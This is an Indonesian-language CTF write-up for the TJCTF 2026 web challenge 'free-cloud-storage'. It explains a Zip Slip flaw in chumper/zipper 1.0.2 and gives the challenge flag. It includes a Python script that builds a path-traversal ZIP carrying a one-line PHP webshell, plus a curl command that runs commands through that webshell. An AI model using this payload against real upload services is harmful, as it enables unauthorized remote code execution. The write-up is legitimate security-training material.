---
ctf: "TJCTF 2026 (Thomas Jefferson CTF)"
kategori: "Web"
challenge: "free-cloud-storage"
flag: "tjctf{i_l0v3_fr33_st0r4g3}"
teknik: "Zip Slip pada chumper/zipper 1.0.2 (extractTo() tidak resolve path) → webshell"
sumber: "https://github.com/Abdelkad3r/tjctf-2026"
---

# free-cloud-storage — TJCTF 2026 (Web)

## Deskripsi Singkat

Servis upload ZIP yang menjalankan `chumper/zipper 1.0.2`, yang `extractTo()`-nya menulis entri archive ke disk **tanpa** meresolve path terhadap direktori tujuan — Zip Slip klasik (perbaikannya baru mendarat di 1.0.3 lewat validasi `realpath()`).

## Eksploitasi

Bangun ZIP berisi `../pwn1.php` dengan satu baris webshell `<?php system($_GET['c']); ?>`. Extractor-nya menulisnya ke `/var/www/html/uploads/../pwn1.php` = `/var/www/html/pwn1.php`, bisa diakses dari docroot.

```python
import zipfile
PAYLOAD = b"<?php system($_GET['c']); ?>"
with zipfile.ZipFile("evil.zip", "w") as z:
    for depth in range(1, 5):
        z.writestr(("../" * depth) + f"pwn{depth}.php", PAYLOAD)
```

Lalu `curl 'https://target/pwn1.php?c=cat%20/var/www/html/flag.txt'`.

## Flag

```
tjctf{i_l0v3_fr33_st0r4g3}
```
